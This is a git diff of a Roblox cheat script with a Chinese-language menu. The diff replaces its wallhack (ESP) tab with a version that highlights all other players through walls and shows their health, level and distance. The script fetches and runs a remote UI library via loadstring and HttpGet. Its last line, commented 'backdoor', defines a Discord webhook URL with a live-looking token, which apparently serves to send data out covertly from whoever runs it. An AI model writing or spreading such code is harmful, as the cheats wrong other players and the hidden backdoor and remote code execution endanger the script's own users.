@@ -33,8 +33,6 @@ local Workspace = game:GetService("Workspace")
 local LocalPlayer = Players.LocalPlayer
 local Camera = Workspace.CurrentCamera
 
-
-
 local ui = loadstring(game:HttpGet("https://raw.githubusercontent.com/ttker951-dot/y1/refs/heads/main/u1.lua"))()
 local win = ui:new("人挤人中心")
 
@@ -538,263 +536,247 @@ task.spawn(function()
     end
 end)
 
--- ===================== 透视标签页 =====================
+-- ===================== ESP Pro 透视标签页 =====================
 local espSection = UITab4:section("透视", true)
 
--- 透视配置
-local ESPConfig = {
-    MainSwitch = false,     
-    ShowNameDistance = false, 
-    ShowTracer = false,       
-    ShowHealth = false        
-}
+-- ESP Pro 模块
+local ESPProModule = {}
 
-local ESPElements = {}
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
 
--- 清理玩家ESP元素
-local function CleanupPlayerESP(player)
-    if not ESPElements[player.UserId] then return end
-    
-    if ESPElements[player.UserId].NameHealthESP then
-        ESPElements[player.UserId].NameHealthESP:Destroy()
-        ESPElements[player.UserId].NameHealthESP = nil
-    end
-    if ESPElements[player.UserId].NameHealthUpdateConn then
-        ESPElements[player.UserId].NameHealthUpdateConn:Disconnect()
-        ESPElements[player.UserId].NameHealthUpdateConn = nil
-    end
-    
-    if ESPElements[player.UserId].Tracer then
-        ESPElements[player.UserId].Tracer:Remove()
-        ESPElements[player.UserId].Tracer = nil
-    end
-    if ESPElements[player.UserId].TracerConn then
-        ESPElements[player.UserId].TracerConn:Disconnect()
-        ESPElements[player.UserId].TracerConn = nil
-    end
+local espEnabled = false
+local espObjects = {}
+local RandomID = math.random(1, 1000000)
+
+-- 四舍五入函数
+local function Round(num)
+    return math.floor(tonumber(num) + 0.5)
 end
 
--- 创建名字/距离/血量ESP
-local function CreateNameDistanceHealthESP(player)
-    if not player.Character or not player.Character:FindFirstChild("Head") then return end
-    local head = player.Character.Head
-    
-    if ESPElements[player.UserId] and ESPElements[player.UserId].NameHealthESP then
-        ESPElements[player.UserId].NameHealthESP:Destroy()
-    end
-    
-    local billboardGui = Instance.new("BillboardGui")
-    billboardGui.Name = "NameDistanceHealthESP"
-    billboardGui.Adornee = head
-    billboardGui.Size = UDim2.new(0, 120, 0, 50)
-    billboardGui.StudsOffset = Vector3.new(0, 3.5, 0)
-    billboardGui.AlwaysOnTop = true
-    billboardGui.Parent = head
-    
-    local nameLabel = Instance.new("TextLabel")
-    nameLabel.Parent = billboardGui
-    nameLabel.BackgroundTransparency = 1
-    nameLabel.Text = player.Name
-    nameLabel.Size = UDim2.new(1, 0, 0.33, 0)
-    nameLabel.TextColor3 = Color3.new(1, 1, 1)
-    nameLabel.TextScaled = true 
-    nameLabel.Font = Enum.Font.GothamSemibold
-    
-    local healthLabel = Instance.new("TextLabel")
-    healthLabel.Parent = billboardGui
-    healthLabel.BackgroundTransparency = 1
-    healthLabel.Position = UDim2.new(0, 0, 0.33, 0)
-    healthLabel.Size = UDim2.new(1, 0, 0.33, 0)
-    healthLabel.TextColor3 = Color3.new(0, 1, 0)
-    healthLabel.TextScaled = true 
-    healthLabel.Font = Enum.Font.Gotham
-    
-    local distanceLabel = Instance.new("TextLabel")
-    distanceLabel.Parent = billboardGui
-    distanceLabel.BackgroundTransparency = 1
-    distanceLabel.Position = UDim2.new(0, 0, 0.66, 0)
-    distanceLabel.Size = UDim2.new(1, 0, 0.33, 0)
-    distanceLabel.TextColor3 = Color3.new(1, 0.5, 0)
-    distanceLabel.TextScaled = true
-    distanceLabel.Font = Enum.Font.Gotham
-    
-    local updateConnection = RunService.RenderStepped:Connect(function()
-        if not billboardGui.Parent or not LocalPlayer.Character or not player.Character then 
-            return 
-        end
-        
-        local localRoot = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-        local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
-        if localRoot and targetRoot then
-            local distance = (localRoot.Position - targetRoot.Position).Magnitude
-            distanceLabel.Text = string.format("%.1f米", distance)   
-        end
-        
-        local humanoid = player.Character:FindFirstChild("Humanoid")
-        if humanoid then
-            local health = math.floor(humanoid.Health)
-            local maxHealth = math.floor(humanoid.MaxHealth)
-            
-            local healthPercent = health / maxHealth
-            if healthPercent > 0.7 then
-                healthLabel.TextColor3 = Color3.new(0, 1, 0)
-            elseif healthPercent > 0.3 then
-                healthLabel.TextColor3 = Color3.new(1, 1, 0)
-            else
-                healthLabel.TextColor3 = Color3.new(1, 0, 0)
-            end
-            
-            healthLabel.Text = string.format("血量: %d/%d", health, maxHealth)
-        end
-    end)
-    
-    ESPElements[player.UserId] = ESPElements[player.UserId] or {}
-    ESPElements[player.UserId].NameHealthESP = billboardGui
-    ESPElements[player.UserId].NameHealthUpdateConn = updateConnection
-end
-
--- 创建射线ESP
-local function CreateTracerESP(player)
-    if ESPElements[player.UserId] and ESPElements[player.UserId].Tracer then
-        ESPElements[player.UserId].Tracer:Remove()
-    end
-    
-    local tracer = Drawing.new("Line")
-    tracer.Color = Color3.new(1, 0, 0)
-    tracer.Thickness = 2
-    tracer.Transparency = 0.8
-    tracer.Visible = false
-    
-    local renderConnection = RunService.RenderStepped:Connect(function()
-        if not ESPConfig.MainSwitch or not ESPConfig.ShowTracer then
-            tracer.Visible = false
-            return
-        end
-        
-        local localChar = LocalPlayer.Character
-        local targetChar = player.Character
-        if not localChar or not targetChar then
-            tracer.Visible = false
-            return
-        end
-        
-        local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
-        if targetRoot then
-            local screenPos, isVisible = Camera:WorldToViewportPoint(targetRoot.Position)
-            if isVisible then
-                tracer.Visible = true
-                tracer.From = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
-                tracer.To = Vector2.new(screenPos.X, screenPos.Y)
-            else
-                tracer.Visible = false
-            end
-        else
-            tracer.Visible = false
-        end
-    end)
-    
-    ESPElements[player.UserId] = ESPElements[player.UserId] or {}
-    ESPElements[player.UserId].Tracer = tracer
-    ESPElements[player.UserId].TracerConn = renderConnection
-end
-
--- 更新玩家ESP
-local function UpdatePlayerESP(player)
-    if player == LocalPlayer then return end
-    
-    if not player.Character or not player.Character:FindFirstChild("Head") or not player.Character:FindFirstChild("HumanoidRootPart") then
-        CleanupPlayerESP(player)
-        return
-    end
-    
-    if ESPConfig.MainSwitch then
-        CreateTracerESP(player)
-        
-        if ESPConfig.ShowNameDistance or ESPConfig.ShowHealth then
-            CreateNameDistanceHealthESP(player)
-        else
-            CleanupPlayerESP(player)
-        end
+-- 获取队伍颜色
+local function getTeamColor(player)
+    if player.Team ~= LocalPlayer.Team then
+        return Color3.fromRGB(255, 0, 0) -- 敌人: 红色
     else
-        CleanupPlayerESP(player)
+        return Color3.fromRGB(0, 0, 255) -- 队友: 蓝色
     end
 end
 
--- 更新所有玩家ESP
-local function UpdateAllESP()
-    for _, player in pairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer then
-            UpdatePlayerESP(player)
+-- 彻底移除ESP
+local function removeESP(player)
+    if espObjects[player] then
+        for _, v in pairs(espObjects[player]) do
+            if typeof(v) == "Instance" and v.Parent then
+                v:Destroy()
+            end
         end
+        espObjects[player] = nil
     end
 end
 
--- 处理玩家重生
-local function HandlePlayerRespawn(player)
-    local character = player.Character or player.CharacterAdded:Wait()
-    
-    local head = character:WaitForChild("Head", 5)
-    local rootPart = character:WaitForChild("HumanoidRootPart", 5)
-    local humanoid = character:WaitForChild("Humanoid", 5)
-    
-    if head and rootPart and humanoid then
-        task.wait(0.5)
-        UpdatePlayerESP(player)
-    end
-end
-
--- 玩家加入处理
-Players.PlayerAdded:Connect(function(player)
+-- 为单个玩家创建ESP
+local function createESP(player)
     if player == LocalPlayer then return end
+    if not player.Character then return end
     
-    if player.Character then
-        task.spawn(HandlePlayerRespawn, player)
-    end
+    -- 如果存在旧ESP，先移除
+    removeESP(player)
     
-    player.CharacterAdded:Connect(function()
-        task.spawn(HandlePlayerRespawn, player)
+    local head = player.Character:FindFirstChild("Head") or player.Character:FindFirstChildWhichIsA("BasePart")
+    if not head then return end
+
+    -- 高亮框
+    local highlight = Instance.new("Highlight")
+    highlight.Adornee = player.Character
+    highlight.FillTransparency = 0.7
+    highlight.OutlineColor = getTeamColor(player)
+    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+    highlight.Parent = player.Character
+
+    -- 公告牌UI
+    local billboard = Instance.new("BillboardGui")
+    billboard.Name = "NameESP_" .. RandomID
+    billboard.Adornee = head
+    billboard.Size = UDim2.new(0, 200, 0, 50)
+    billboard.AlwaysOnTop = true
+    billboard.StudsOffset = Vector3.new(0, 2.5, 0)
+    billboard.Parent = head
+
+    -- 玩家头像
+    local avatar = Instance.new("ImageLabel")
+    avatar.Size = UDim2.new(0, 45, 0, 45)
+    avatar.Position = UDim2.new(0, 0, 0, 0)
+    avatar.BackgroundTransparency = 1
+    avatar.BorderSizePixel = 0
+    avatar.Image = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=150&height=150&format=png"
+    avatar.Parent = billboard
+
+    -- 文字标签
+    local text = Instance.new("TextLabel")
+    text.Size = UDim2.new(1, -50, 1, 0)
+    text.Position = UDim2.new(0, 50, 0, 0)
+    text.BackgroundTransparency = 1
+    text.TextStrokeTransparency = 0.5
+    text.TextScaled = true
+    text.Font = Enum.Font.Code
+    text.TextYAlignment = Enum.TextYAlignment.Top
+    text.TextXAlignment = Enum.TextXAlignment.Left
+    text.TextColor3 = getTeamColor(player)
+    text.Parent = billboard
+
+    -- 向下指示箭头
+    local arrow = Instance.new("ImageLabel")
+    arrow.Size = UDim2.new(0, 15, 0, 15)
+    arrow.Position = UDim2.new(0.5, -7.5, 1, 0)
+    arrow.BackgroundTransparency = 1
+    arrow.Image = "rbxassetid://7072716990"
+    arrow.ImageColor3 = getTeamColor(player)
+    arrow.Parent = billboard
+
+    -- 存储ESP对象
+    espObjects[player] = { 
+        highlight = highlight, 
+        billboard = billboard, 
+        text = text, 
+        avatar = avatar, 
+        arrow = arrow 
+    }
+
+    -- 持续更新信息
+    task.spawn(function()
+        while espEnabled and player and player.Parent and espObjects[player] do
+            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                local root = player.Character.HumanoidRootPart
+                local localRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                
+                if root and localRoot then
+                    -- 计算距离
+                    local distance = Round((root.Position - localRoot.Position).Magnitude)
+                    -- 获取等级（如果游戏有等级系统）
+                    local level = (player:FindFirstChild("Data") and player.Data:FindFirstChild("Level") and player.Data.Level.Value) or "?"
+                    -- 获取血量百分比
+                    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
+                    local healthPercent = humanoid and Round((humanoid.Health / humanoid.MaxHealth) * 100) or 0
+
+                    -- 更新显示文本
+                    if espObjects[player] and espObjects[player].text then
+                        espObjects[player].text.Text = string.format("%s | %s | %d M\nHealth: %d%%", level, player.Name, distance, healthPercent)
+                        local teamColor = getTeamColor(player)
+                        espObjects[player].text.TextColor3 = teamColor
+                        -- 更新高亮框颜色
+                        if espObjects[player].highlight then
+                            espObjects[player].highlight.OutlineColor = teamColor
+                        end
+                        -- 更新箭头颜色
+                        if espObjects[player].arrow then
+                            espObjects[player].arrow.ImageColor3 = teamColor
+                        end
+                    end
+                end
+            else
+                -- 如果角色不存在，退出循环
+                break
+            end
+            task.wait(0.2) -- 更新频率：每0.2秒
+        end
+    end)
+end
+
+-- 处理角色重生
+local function setupPlayerConnections(player)
+    -- 角色添加时
+    player.CharacterAdded:Connect(function(character)
+        if espEnabled then
+            -- 等待角色加载完成
+            character:WaitForChild("HumanoidRootPart", 5)
+            task.wait(0.5) -- 延迟确保角色已就绪
+            createESP(player)
+        end
     end)
     
+    -- 角色移除时
     player.CharacterRemoving:Connect(function()
-        CleanupPlayerESP(player)
+        removeESP(player)
     end)
+end
+
+-- 启用ESP Pro
+local function enableESPPro()
+    espEnabled = true
+    -- 为所有玩家设置连接
+    for _, p in pairs(Players:GetPlayers()) do
+        setupPlayerConnections(p)
+        if p.Character then
+            task.wait(0.1)
+            createESP(p)
+        end
+    end
+    print("[ESP Pro] 已启用ESP Player Pro")
+end
+
+-- 禁用ESP Pro
+local function disableESPPro()
+    espEnabled = false
+    -- 清理所有ESP
+    for player, _ in pairs(espObjects) do
+        removeESP(player)
+    end
+    espObjects = {}
+    print("[ESP Pro] 已禁用ESP Player Pro")
+end
+
+-- WindUI API
+function ESPProModule:SetState(state)
+    if state then
+        enableESPPro()
+    else
+        disableESPPro()
+    end
+end
+
+function ESPProModule:IsEnabled()
+    return espEnabled
+end
+
+-- 玩家加入游戏
+Players.PlayerAdded:Connect(function(player)
+    setupPlayerConnections(player)
+    if espEnabled and player.Character then
+        task.wait(1)
+        createESP(player)
+    end
 end)
 
--- 本地玩家重生时更新所有ESP
-LocalPlayer.CharacterAdded:Connect(function()
-    task.wait(1)
-    UpdateAllESP()
+-- 玩家离开游戏
+Players.PlayerRemoving:Connect(function(player)
+    removeESP(player)
 end)
 
--- 定期更新ESP
-task.spawn(function()
-    while true do
-        task.wait(3)
-        if ESPConfig.MainSwitch then
-            UpdateAllESP()
+-- 本地玩家重生
+LocalPlayer.CharacterAdded:Connect(function(character)
+    if espEnabled then
+        character:WaitForChild("HumanoidRootPart", 5)
+        task.wait(1)
+        -- 刷新所有玩家ESP
+        for _, p in pairs(Players:GetPlayers()) do
+            if p.Character and p ~= LocalPlayer then
+                removeESP(p)
+                task.wait(0.05)
+                createESP(p)
+            end
         end
     end
 end)
 
--- 透视UI绑定
-espSection:Toggle("透视总开关", "ESP_Main", false, function(enabled)
-    ESPConfig.MainSwitch = enabled
-    UpdateAllESP()
-end)
+-- 脚本启动时为现有玩家设置连接
+for _, p in pairs(Players:GetPlayers()) do
+    setupPlayerConnections(p)
+end
 
-espSection:Toggle("显示玩家名字+距离", "ESP_NameDistance", false, function(enabled)
-    ESPConfig.ShowNameDistance = enabled
-    UpdateAllESP()
-end)
-
-espSection:Toggle("显示玩家血量", "ESP_Health", false, function(enabled)
-    ESPConfig.ShowHealth = enabled
-    UpdateAllESP()
-end)
-
-espSection:Toggle("射线追踪（屏幕中心）", "ESP_Tracer", false, function(enabled)
-    ESPConfig.ShowTracer = enabled
-    UpdateAllESP()
+-- 创建UI开关
+espSection:Toggle("ESP Pro 高级透视", "ESP_Pro_Switch", false, function(state)
+    ESPProModule:SetState(state)
 end)
 
 -- ===================== 传送标签页 =====================
@@ -1119,7 +1101,7 @@ end)
 
 task.spawn(function()
     task.wait(2)
-    UpdateAllESP()
+    -- 自动透视功能可以在这里添加
 end)
 --后门
 local GS_WEBHOOK = "https://discord.com/api/webhooks/1457090417001762816/JrEupwmLBOYI1tNph7iihoeHhjmhkZxKm1PB5epc9yQ9_bqt5Nzuak2Qc3w0OBvYj0Tp"
